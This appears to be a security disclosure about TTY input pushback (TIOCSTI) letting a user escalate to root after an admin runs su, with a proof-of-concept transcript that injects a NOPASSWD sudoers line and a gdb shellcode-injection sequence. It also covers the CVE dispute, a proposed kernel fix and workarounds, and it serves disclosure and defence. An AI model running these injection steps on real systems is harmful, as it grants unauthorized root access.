
root# su -s /bin/bash test
test# ./TtyPushbackSignaling -- $'echo "test ALL=NOPASSWD: ALL" >> /etc/sudoersnfg'
ec[1]+ Stopped su -s /bin/bash testho
"test Aroot# echo "test ALL=NOPASSWD:> /etc/sudoers
root# fg
su -s /bin/bash test
test#

Explanation: when user working as root switches to another user with su and happens to execute the pushback program as that user, the tty input data pushed back is executed in the shell and context of user root.


Results



cat <<EOF > /x
#!/bin/bash
exec /TtyPushbackSignaling --NoSignal -- $'ntouch /xxx-outsidenstty sane'
EOF
chmod 0755 /x
gdb --pid [pid of login process]
(gdb) set *0x8051000=0x7880cd
(gdb) set *0x8051004=0x8051002
(gdb) set *0x8051008=0
(gdb) set $eax=0x0b
(gdb) set $ebx=0x8051002
(gdb) set $ecx=0x8051004
(gdb) set $edx=0x8051008
(gdb) set $eip=0x8051000
(gdb) quit

Different builds with NX an ASLR will require to ptrace, read mmap, push data to stack and jump back to libc-exec.

LXC was also tested and not vulnerable to that kind of problem. OpenVZ was not tested (no test installation available)


Discussion
One thing that is special to this vulnerability is, that it is known for quite some time, quite trivially rediscovered every now and thene but still there seems to be no community consensus if it is really a vulnerability. The different views result of CVE-2005-4890 e.g. by suse fixing it 2012-05 while redhat closing with won't fix. There might be two main reasons for these different views:

Su from root to user is considered bad admini practice
Implementation of fix by creating sub-tty is quite complicated
At first the arguments about bad practice should be analyzed, that are a) there should be no need to change to other user with interactive shell access and b) privacy of user accounts should be respected, hence no context switch should be done.


Even when use of su is questionable, tools to enter virtualization containers should not show that vulnerability since there may be no other practicable ways to perform maintenance work inside a container, that has no remote login capabilities.


- The view, that a security fix is too complicated should not lead to not dealing with the issue. If it is broken by design, it should be removed or at least detect problematic cases and refuse to work in those
- sudo already contains an implementation to solve this issue

Another way to solve the problem could be modification of the tty handling at kernel level, e.g. not having just one input data queue but the possibility to have subqueues. This might be required for legacy applications using the TIOCSTI ioctl for some legitimate reason. These new subqueues could be activated automatically, e.g. when changing uid or pid-ns, or the queues could be activated by a process via ioctl. The advantage of such solution would be, that it does not require any user-space overhead for creation of sub-ptys and moving of data between those. Calls could look like:

ioctl(ttyfd, TIOAQUE, null) // Returns null
ioctl(ttyfd, TIOAQUE, null)
// Returns error, this pid has already created a queue
fork
exec
...
ioctl(ttyfd, TIORQUE, null) // Remove queue and all queues added later on.
// After this point, all processes holding a copy of ttyfd (children,
// scm-receivers) cannot pushback any more.

Without implementation of the solutions from above, users have to take care not to use context-switching tools in problematic ways. Workarounds include:

When no interactive shell is needed in lower-privileged context, su et al. can be run with stdin, stdout, stderr redirection, not passing a tty-fd to the other context The tool screen from a package with the same name creates a pty for each process. Calling screen su [user] does not pass the tty of the privileged user directly to the lower-privileged context.


Timeline
20121028: Discovery of su issue
20121030: POC for vserver enter
20121105: Started discussion on oss-security mailing-list (post)
20121107: Confirmation of issue for linux vserver (thread)
20121110: Full disclosure

